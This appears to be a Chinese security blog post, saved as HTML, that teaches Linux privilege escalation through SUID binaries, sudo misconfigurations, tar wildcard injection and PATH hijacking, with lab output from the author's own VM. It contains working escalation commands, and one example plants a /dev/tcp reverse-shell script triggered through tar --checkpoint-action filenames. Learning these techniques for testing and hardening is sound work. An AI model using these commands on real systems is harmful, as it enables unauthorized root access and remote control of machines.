@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>Linux提权学习</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/1/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Linux提权学习'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/1/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-09-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-09-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash.jpg' />
+<meta name="twitter:title" content="Linux提权学习">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/1/">
+                <img src="/p/1/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_800x0_resize_q75_box.jpg"
+                        srcset="/p/1/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_800x0_resize_q75_box.jpg 800w, /p/1/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post Linux提权学习" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #2a9d8f; color: #fff;">
+                渗透测试
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/1/">Linux提权学习</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="linux提权">Linux提权</h1>
+<h2 id="suid和sudo提权">suid和sudo提权</h2>
+<h3 id="suid">suid</h3>
+<p>SUID，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Tom)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权。</p>
+<p>一个程序执行时会有三个id状态，分别如下：</p>
+<ul>
+<li>Real User ID：执行这个程序的用户的真实id，以用户登录时候的id为准</li>
+<li>Effective User ID：是程序执行过程中使用权限时真正起作用的用户id，操作系统在检查一个程序有没有某个权限的时候会查看该id</li>
+<li>Saved User ID：程序临时提权时需要保存的先前的用户id，等提权结束后需要回退到这个用户id</li>
+</ul>
+<h4 id="suid用途">suid用途</h4>
+<p>如果用户Tom有另一个用户root的程序的执行权限，并且root给这个程序设置了SUID位，那么Tom就可以用root的权限来执行这个程序</p>
+<h4 id="遍历suid文件">遍历suid文件</h4>
+<pre tabindex="0"><code>find / -perm -u=s 2&gt;/dev/null
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 174; 
+			flex-basis: 418px"
+	>
+	<a href="/p/1/image-20211013091410929.png" data-size="831x477">
+		<img src="/p/1/image-20211013091410929.png"
+			width="831"
+			height="477"
+			srcset="/p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_480x0_resize_box_3.png 480w, /p/1/image-20211013091410929_hu87c33afc0c5a5c216c30e12815514172_81181_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20211013091410929">
+	</a>
+	
+	<figcaption>image-20211013091410929</figcaption>
+	
+</figure></p>
+<h4 id="设置suid">设置suid</h4>
+<pre tabindex="0"><code># 设置suid位
+chmod 4xxx filename
+
+# 设置sgid位
+chmod 2xxx filename
+
+# 设置suid和sgid位
+chmod 6xxx filename
+
+其中xxx指的是文件的一般读写执行权限
+</code></pre><h4 id="取消suid">取消suid</h4>
+<pre tabindex="0"><code># 取消suid和sgid
+chmod xxx filename
+# 取消suid或sgid
+chmod u-s filename or chmod g-s filename
+</code></pre><h4 id="注意">注意</h4>
+<p>suid位只对编译过的可执行程序起作用，比如给某一个sh脚本赋予suid位置，而sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的suid位，就不会起作用了</p>
+<h3 id="suid提权姿势">suid提权姿势</h3>
+<h4 id="find">find</h4>
+<pre tabindex="0"><code>find . -exec /bin/sh -p \; -quit
+</code></pre><blockquote>
+<p>注意:前提都是find可执行文件具备suid</p>
+</blockquote>
+<p>其他类似的：https://gtfobins.github.io/</p>
+<h3 id="sudo">sudo</h3>
+<p>sudo权限是把本来只能超级用户执行的命令<strong>赋予普通用户执行</strong></p>
+<p>要配置sudo，需要修改/etc/sudoers</p>
+<pre tabindex="0"><code># sudoers文件对某个用户或用户组的sudo配置
+
+授权用户/组 主机   =[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...
+字段1      字段2   字段3                字段4              字段5
+
+# 字段1
+不以%开头表示授权用户； 以%开头表示授权用户组
+# 字段2
+表示允许登录的主机；ALL表示所有;如果该字段不为ALL,表示授权用户只能在某些机器上登录本服务器来执行sudo命令
+# 字段3
+如果省略, 相当于(root:root)，表示可以通过sudo提权到root; 如果为(ALL)或者(ALL:ALL), 表示能够提权到(任意用户:任意用户组)
+# 字段4
+可能取值是NOPASSWD:，注意NOPASSWD后面带有冒号:，表示执行sudo时可以不需要输入密码
+# 字段5
+用逗号分开一系列命令，ALL表示允许所有操作
+</code></pre><p>sudo -l可查看自己的sudo配置</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 450; 
+			flex-basis: 1080px"
+	>
+	<a href="/p/1/image-20211012170101086.png" data-size="621x138">
+		<img src="/p/1/image-20211012170101086.png"
+			width="621"
+			height="138"
+			srcset="/p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_480x0_resize_box_3.png 480w, /p/1/image-20211012170101086_hue0b0fd93062c8477a62694e97137dc63_21606_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20211012170101086">
+	</a>
+	
+	<figcaption>image-20211012170101086</figcaption>
+	
+</figure></p>
+<h3 id="sudo提权姿势">sudo提权姿势</h3>
+<pre tabindex="0"><code>sudo /usr/bin/awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+
+sudo find . -exec /bin/sh \; -quit
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 940; 
+			flex-basis: 2256px"
+	>
+	<a href="/p/1/image-20211012170437130.png" data-size="677x72">
+		<img src="/p/1/image-20211012170437130.png"
+			width="677"
+			height="72"
+			srcset="/p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_480x0_resize_box_3.png 480w, /p/1/image-20211012170437130_hu9a6d4a5a0e2bb1573c0fd3e5e54b0c07_15534_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20211012170437130">
+	</a>
+	
+	<figcaption>image-20211012170437130</figcaption>
+	
+</figure></p>
+<p>其他类似sudo提权命令:https://gtfobins.github.io/</p>
+<h2 id="通配符提权">通配符提权</h2>
+<blockquote>
+<p>该类提权一般都配合计划任务，发现计划任务使用了相关命令通配符</p>
+</blockquote>
+<h3 id="通配符">通配符</h3>
+<p>*：匹配任意数量字符</p>
+<p>?：匹配任意单个字符</p>
+<p>[]：一组字符，其中任意一个字符都可匹配该位置单个字符</p>
+<p>~：单个表示当前用户主目录名称，~后跟用户名表示某用户根目录名称</p>
+<h3 id="示例">示例</h3>
+<h4 id="示例1">示例1</h4>
+<p>test目录下有2个文件</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ ls
+test2  test.txt
+</code></pre><p>执行cat *</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ cat *
+sadadada
+hahahah
+</code></pre><p>创建&ndash;help文件</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ echo &quot;my help&quot; &gt; --help
+cool@cool-virtual-machine:~/test$ ls
+--help  test2  test.txt
+</code></pre><p>再次执行cat *</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ cat *
+Usage: cat [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+  -A, --show-all           equivalent to -vET
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+
+</code></pre><p>可观察到并没有读取&quot;&ndash;help&quot;文件的内容，而是被视为&quot;cat&quot;命令的&ndash;help命令帮助选项</p>
+<p>这种可称为**&ldquo;wildcard wildness&rdquo;**</p>
+<h4 id="示例2">示例2</h4>
+<p>在test目录下生成反弹shell脚本</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ echo &quot;/bin/sh -i&gt;&amp;/dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot; &gt; shell.sh
+cool@cool-virtual-machine:~/test$ ls
+shell.sh
+</code></pre><p>生成如下文件</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+cool@cool-virtual-machine:~/test$ echo &quot;&quot; &gt; &quot;--checkpoint=1&quot;
+cool@cool-virtual-machine:~/test$ ls
+--checkpoint=1  --checkpoint-action=exec=sh shell.sh  shell.sh
+</code></pre><p>监听端口</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~$ nc -nvlp 7777
+Listening on [0.0.0.0] (family 0, port 7777)
+</code></pre><p>执行tar命令</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ tar cf /tmp/test.tar *
+</code></pre><p>监听结果</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~$ nc -nvlp 7777
+Listening on [0.0.0.0] (family 0, port 7777)
+Connection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 36508)
+sh-4.3$ id
+id
+uid=1000(cool) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+</code></pre><p>注意</p>
+<blockquote>
+<p>tar命令的通配符注入需要进入到目标目录，使用通配符&quot;*&quot;，例如 tar -cf /tmp/test.tar *</p>
+<p>使用绝对路径，如：tar -cf /tmp/test.tar /tmp/test/*, 那么&ndash;checkpoint等会失效，无法执行命令</p>
+</blockquote>
+<h2 id="敏感文件">敏感文件</h2>
+<h2 id="path-环境变量劫持">Path 环境变量劫持</h2>
+<p>system函数会调用shell(sh)执行命令(传入的参数)</p>
+<p>现有这样一段可执行程序，如：</p>
+<pre tabindex="0"><code>#include&lt;unistd.h&gt;
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system(&quot;whoami&quot;);
+}
+</code></pre><p>以root用户编译后生成“haha”可执行文件如下(具有suid位)：</p>
+<pre tabindex="0"><code>root@cool-virtual-machine:/home/cool/test# ll
+total 40
+drwxrwxr-x  2 cool cool 4096 10月 25 10:56 ./
+drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
+-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
+</code></pre><p>以普通用户编译这样一段程序：</p>
+<pre tabindex="0"><code>#include&lt;unistd.h&gt;
+void main()
+{
+	system(&quot;/bin/bash&quot;);
+}
+</code></pre><p>生成&quot;whoami&quot;文件：</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ ll
+total 40
+drwxrwxr-x  2 cool cool 4096 10月 25 11:00 ./
+drwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../
+-rwsr-xr-x  1 root root 8656 10月 25 10:56 haha*
+-rw-rw-r--  1 cool cool   86 10月 25 10:56 test.c
+-rwxrwxr-x  1 cool cool 8608 10月 25 10:50 whoami*
+</code></pre><p>劫持环境变量：</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ export PATH=/home/cool/test:$PATH
+cool@cool-virtual-machine:~/test$ which whoami
+/home/cool/test/whoami
+</code></pre><p>执行./haha：</p>
+<pre tabindex="0"><code>cool@cool-virtual-machine:~/test$ ./haha
+root@cool-virtual-machine:~/test# id
+uid=0(root) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#suid和sudo提权">suid和sudo提权</a>
+      <ol>
+        <li><a href="#suid">suid</a>
+          <ol>
+            <li><a href="#suid用途">suid用途</a></li>
+            <li><a href="#遍历suid文件">遍历suid文件</a></li>
+            <li><a href="#设置suid">设置suid</a></li>
+            <li><a href="#取消suid">取消suid</a></li>
+            <li><a href="#注意">注意</a></li>
+          </ol>
+        </li>
+        <li><a href="#suid提权姿势">suid提权姿势</a>
+          <ol>
+            <li><a href="#find">find</a></li>
+          </ol>
+        </li>
+        <li><a href="#sudo">sudo</a></li>
+        <li><a href="#sudo提权姿势">sudo提权姿势</a></li>
+      </ol>
+    </li>
+    <li><a href="#通配符提权">通配符提权</a>
+      <ol>
+        <li><a href="#通配符">通配符</a></li>
+        <li><a href="#示例">示例</a>
+          <ol>
+            <li><a href="#示例1">示例1</a></li>
+            <li><a href="#示例2">示例2</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#敏感文件">敏感文件</a></li>
+    <li><a href="#path-环境变量劫持">Path 环境变量劫持</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
